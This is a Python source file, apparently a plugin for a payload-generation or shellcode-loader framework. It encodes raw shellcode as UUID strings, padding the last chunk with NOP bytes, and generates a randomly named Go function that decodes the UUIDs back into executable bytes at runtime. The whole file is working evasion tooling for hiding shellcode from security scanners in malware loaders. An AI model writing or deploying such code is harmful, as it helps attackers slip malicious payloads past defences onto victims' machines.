import random
import string
from uuid import UUID

class UUIDEncode:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))

    def imports(self) -> list[str]:
        return ['github.com/google/uuid']

    def compilerOptions(self) -> list[str]:
        return ['github.com/google/uuid']

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        self.size = 0
        self.shellcodeSize = len(decoded)
        for i in range(0, len(decoded), 16):
            chunk = decoded[i:i+16]
            if len(chunk) < 16:
                chunk = chunk + (b"\x90" * (16 - len(chunk)))
            encoded.append(str(UUID(bytes = chunk)))
            self.size += 1
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
func {self.name}(uuids []string) []byte {{
    decoded := make([]byte, {self.size} * 16)
    for i, uuidstring := range uuids {{
        parsed, _ := uuid.Parse(uuidstring)
        copy(decoded[i*16:(i+1)*16],parsed[:])
    }}
    return decoded
}}
"""
